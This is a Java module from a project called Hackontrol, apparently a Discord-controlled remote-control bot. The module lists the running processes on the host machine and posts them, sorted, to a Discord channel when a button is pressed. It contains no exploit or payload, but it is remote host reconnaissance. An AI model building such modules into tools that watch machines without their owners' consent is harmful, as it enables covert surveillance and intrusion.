package com.khopan.hackontrol.module;

import java.util.ArrayList;
import java.util.Comparator;
import java.util.List;

import com.khopan.hackontrol.NativeLibrary;
import com.khopan.hackontrol.ProcessEntry;
import com.khopan.hackontrol.manager.interaction.ButtonContext;
import com.khopan.hackontrol.manager.interaction.ButtonManager;
import com.khopan.hackontrol.manager.interaction.ButtonManager.ButtonType;
import com.khopan.hackontrol.manager.interaction.InteractionManager;
import com.khopan.hackontrol.registry.Registry;
import com.khopan.hackontrol.utils.LargeMessage;
import com.khopan.hackontrol.utils.interaction.HackontrolButton;

import net.dv8tion.jda.api.interactions.callbacks.IReplyCallback;
import net.dv8tion.jda.api.interactions.components.ActionRow;
import net.dv8tion.jda.api.interactions.components.buttons.Button;
import net.dv8tion.jda.api.utils.messages.MessageCreateRequest;

public class ProcessModule extends Module {
	private static final String MODULE_NAME = "process";

	private static final Button BUTTON_SNAPSHOT = ButtonManager.staticButton(ButtonType.SUCCESS, "Snapshot", "processSnapshot");
	private static final Button BUTTON_REFRESH  = ButtonManager.staticButton(ButtonType.SUCCESS, "Refresh", "refreshSnapshot");

	private SortRule sortRule;

	public ProcessModule() {
		this.sortRule = SortRule.SORT_BY_NAME;
	}

	@Override
	public String getName() {
		return ProcessModule.MODULE_NAME;
	}

	@Override
	public void preInitialize(Registry registry) {
		registry.register(InteractionManager.BUTTON_REGISTRY, ProcessModule.BUTTON_SNAPSHOT, this :: buttonSnapshot);
		registry.register(InteractionManager.BUTTON_REGISTRY, ProcessModule.BUTTON_REFRESH,  this :: buttonRefresh);
	}

	@Override
	public void initialize() {
		this.channel.sendMessageComponents(ActionRow.of(ProcessModule.BUTTON_SNAPSHOT)).queue();
	}

	private void buttonSnapshot(ButtonContext context) {
		this.send(context);
	}

	private void buttonRefresh(ButtonContext context) {
		HackontrolButton.deleteMessages(context);
		this.send(context);
	}

	private void actionRow(MessageCreateRequest<?> request, long... identifiers) {
		request.addActionRow(ProcessModule.BUTTON_REFRESH, HackontrolButton.delete(identifiers));
	}

	private void send(IReplyCallback callback) {
		List<ProcessEntry> processList = new ArrayList<>();
		processList.addAll(List.of(NativeLibrary.listProcess()));
		processList.sort(this.sortRule.comparator);
		int longestIdentifierLength = 0;

		for(int i = 0; i < processList.size(); i++) {
			longestIdentifierLength = Math.max(longestIdentifierLength, Integer.toString(processList.get(i).processIdentifier).length());
		}

		longestIdentifierLength += 3;
		int currentProcessIdentifier = NativeLibrary.currentIdentifier();
		StringBuilder builder = new StringBuilder();

		for(int x = 0; x < processList.size(); x++) {
			ProcessEntry entry = processList.get(x);

			if(x > 0) {
				builder.append('\n');
			}

			builder.append('`');
			builder.append(entry.processIdentifier);
			int space = longestIdentifierLength - Integer.toString(entry.processIdentifier).length();

			for(int y = 0; y < space; y++) {
				builder.append(' ');
			}

			builder.append(entry.executableFile);

			if(entry.processIdentifier == currentProcessIdentifier) {
				builder.append(" (Current Process)");
			}

			builder.append('`');
		}

		LargeMessage.send(builder.toString(), callback, this :: actionRow);
	}

	private static enum SortRule {
		SORT_BY_NAME((x, y) -> x.executableFile.compareToIgnoreCase(y.executableFile)),
		SORT_BY_PID(Comparator.comparingInt(x -> x.processIdentifier));

		private final Comparator<? super ProcessEntry> comparator;

		SortRule(Comparator<? super ProcessEntry> comparator) {
			this.comparator = comparator;
		}
	}
}
